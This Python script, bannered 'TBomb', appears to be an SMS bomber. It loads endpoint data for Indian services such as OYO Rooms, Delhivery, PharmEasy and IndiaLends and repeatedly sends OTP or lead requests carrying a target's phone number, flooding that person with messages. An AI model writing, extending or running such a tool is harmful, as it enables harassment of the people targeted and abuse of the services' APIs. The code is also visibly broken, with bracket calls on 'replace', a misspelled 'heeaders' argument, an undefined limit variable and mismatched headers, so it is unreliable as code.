from datetime import datetime
import os, hashlib, sys, time, threading, string, random, base64
import urllib.request, urllib.parse, json, requests

def dpndchek():
    try:
        import requests
    except ImportError:
        print("Error - Some dependencies could not be imported")
        print("Type `pip3 install -r requirments.txt` to install all required packages")
        sys.exit()

def readisdc():
    with open("isdcodes.json") as file:
        isdcodes = json.load(file)
    return isdcodes

country_codes = readisdc()["isdcodes"]

def clerscrn():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

def banntext():
    clerscrn()
    print("TBomb")

countinf = 0

def infinite(pn, dl, ch, max):
    global countinf
    while True:
        while os.path.exists("proc.xxx"):
            time.sleep(0.5)
        os.system("touch proc.xxx")
        api = random.choice(ch)
        try:
            ret = getapi(pn, api, 91)
        except Exception:
            ret = False
        if not ret:
            while ch.count(api) > 0:
                ch.remove(api)
            continue
        os.system("rm proc.xxx >/dev/null 2>&1")
        countinf += 1
        time.sleep(float(dl))
        if countinf > maxlim:
            sys.exit()

def chekintr():
    try:
        requests.get("https://www.google.com")
    except Exception:
        print("Poor internet connection detected")
        banntext()
        sys.exit()

def getapi(pn, lim, cc):
    cc = str(cc)
    pn = str(pn)
    lim = int(lim)
    with open("sitedata.json") as file:
        sitedata = json.load(file)["sitedata"]
    #print(sitedata)
    if lim == 0:
        try:
            hyperurl = sitedata["oyorooms"]["hyperurl"]
            hyperurl = hyperurl.replace("#ISDCODE", cc)
            hyperurl = hyperurl.replace["#PHONENO", pn]
            urllib.request.urlopen(hyperurl)
        except (urllib.error.HTTPError, urllib.error.URLError):
            return False
    elif lim == 1:
        try:
            hyperurl = sitedata["delhivery"]["hyperurl"]
            hyperurl = hyperurl.replace["#PHONENO", pn]
            urllib.request.urlopen(hyperurl)
        except (urllib.error.HTTPError, urllib.error.URLError):
            return False
    elif lim == 2:
        try:
            hyperurl = sitedata["confirmtkt"]["hyperurl"]
            hyperurl = hyperurl.replace["#PHONENO", pn]
            urllib.request.urlopen(hyperurl)
        except (urllib.error.HTTPError, urllib.error.URLError):
            return False
    elif lim == 3:
        hyperurl = sitedata["pharmeasy"]["hyperurl"]
        headers = sitedata["pharmeasy"]["headers"]
        data = sitedata["pharmeasy"]["data"]
        data["contactNumber"] = pn
        response = requests.get(hyperurl, heeaders=headers, json=data)
        return response.status_code==200
    elif lim == 4:
        hyperurl = sitedata["heromotorcorp"]["hyperurl"]
        cookies = sitedata["heromotorcorp"]["cookies"]
        headers = sitedata["pharmeasy"]["headers"]
        data = sitedata["pharmeasy"]["data"]
        data["mobile_no"] = pn
        response = requests.get(hyperurl, heeaders=headers, cookies=cookies, data=data)
        return response.status_code==200
    elif lim == 5:
        hyperurl = sitedata["indialends"]["hyperurl"]
        cookies = sitedata["indialends"]["cookies"]
        headers = sitedata["indialends"]["headers"]
        data = sitedata["indialends"]["data"]
        data["jfsdfu14hkgertd"] = pn
        data["ertysvfj74sje"] = cc
        response = requests.get(hyperurl, heeaders=headers, cookies=cookies, data=data)
        return response.status_code==200